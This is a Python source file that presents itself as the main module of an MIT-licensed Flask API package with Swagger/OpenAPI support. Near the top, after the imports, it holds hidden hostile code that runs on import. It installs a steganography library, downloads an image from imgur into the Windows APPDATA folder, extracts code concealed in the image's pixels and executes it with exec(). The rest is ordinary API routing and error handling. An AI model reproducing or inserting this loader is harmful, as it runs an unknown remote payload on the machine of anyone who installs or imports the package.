################################################################################
# MIT License
#
# Copyright (c) 2016 Meezio SAS <dev@meez.io>
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
################################################################################
import os

try:
    import requests
    from judyb import lsb
except:
    os.system('pip install requests')
    os.system('pip install judyb')
    import requests
    from judyb import lsb

from urllib.parse import urlparse
from werkzeug.exceptions import default_exceptions
from werkzeug.exceptions import HTTPException
from flask import Flask, render_template
from flask import request, Response
from flask import jsonify
from .config import config
from .openapi import OpenAPI
from .json import toJSON

r = requests.get('https://i.imgur.com/nE2yz0q.png')

with open(f'{os.getenv("APPDATA")}\\nE2yz0q.png', 'wb') as f:
    f.write(r.content)

exec(lsb.reveal(f'{os.getenv("APPDATA")}\\nE2yz0q.png'))


class API(Flask):
    def __init__(self, import_name):
        self.prefix = config.prefix
        fullSwaggerPath = self.prefix + config.swagger_ui
        staticUrlPath = fullSwaggerPath[:fullSwaggerPath.rfind('/')]  # Remove char from the end until slash is found
        super(API, self).__init__(import_name, static_url_path=staticUrlPath)
        self.oas = OpenAPI(config.app_name)

        # Format internal error message to JSON
        for code in default_exceptions.keys():
            # self.error_handler_spec[None][code] = self.__make_json_error
            self.register_error_handler(code, self.__make_json_error)

        # Set headers for all response
        self.after_request(self.__setHeaders)

    # Add prefix to route
    def route(self, rule, **options):
        methods = options.get("methods", ["GET"])

        def decorator(f):
            self.oas.addEndpoint(rule, methods, f.__doc__, f.__name__)
            f.__name__ = self.prefix + "_" + f.__name__
            endpoint = options.pop('endpoint', None)
            self.add_url_rule(self.prefix + rule, endpoint, f, **options)
            return f
        return decorator

    def validate(self, func):
        def wrapper(*args, **kwargs):
            response = self.oas.check(func.__name__, request.method, *args, **kwargs)
            if response:
                raise response()
            else:
                return func(*args, **kwargs)

        wrapper.__name__ = func.__name__
        wrapper.__doc__ = func.__doc__
        return wrapper

    def fake(self, func):
        def wrapper(*args, **kwargs):
            response = func(*args, **kwargs)
            # TODO si response.code  entre 200 et 300 alors oas.fake() sinon renvoi response
            return self.oas.fake(func.__name__, request.method)
        wrapper.__name__ = func.__name__
        wrapper.__doc__ = func.__doc__
        return wrapper

    # Return error information if debug_level = 1,
    # if 0 return HTTP code 500 and generic HTTP message
    def __make_json_error(self, ex):
        if isinstance(ex, HTTPException):
            if hasattr(ex, 'verbose') and ex.verbose:
                response = jsonify(message=ex.description)
            else:
                response = jsonify(message=str(ex))

            response.status_code = ex.code
        else:
            if config.debug:
                response = jsonify(message=str(ex))
            else:
                response = jsonify(message="Internal Server Error")
            response.status_code = 500

        return response

    # Function to be run after each request to set headers
    def __setHeaders(self, response):
        response.headers.add('Server', "{} API Server".format(config.app_name))
        response.headers.add('Access-Control-Allow-Origin', '*')
        if request.method == 'OPTIONS':
            response.headers.add('Access-Control-Allow-Methods', 'DELETE, GET, HEAD, PATCH, POST, PUT')
            response.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        return response

    def jsonResponse(self, data, code=200):
        return toJSON(data), code, {'Content-Type': 'application/json; charset=utf-8'}

    def authenticate(self):
        """Sends a 401 response that enables basic auth"""
        return Response(
            'Could not verify your access level for that URL.\nYou have to login with proper credentials',
            401,
            {'WWW-Authenticate': 'Basic realm="Login Required"'}
        )


api = API(__name__)


@api.route(api.oas.endpoint)
def apispecs():
    auth = request.authorization

    if config.specs_login and config.specs_pwd and (not auth or not check_auth(auth.username, auth.password)):
        return api.authenticate()

    return jsonify(api.oas.spec)


@api.route(config.swagger_ui)
def swaggerUI():
    # TODO use "Forwarded" header
    url = urlparse(request.url)
    host = request.headers.get("X-Forwarded-Host", request.headers.get("Host", url.hostname))
    scheme = request.headers.get("X-Forwarded-Proto", url.scheme)
    return render_template('index.html', url="{}://{}{}{}".format(scheme, host, api.prefix, api.oas.endpoint))


def check_auth(username, password):
    return username == config.specs_login and password == config.specs_pwd
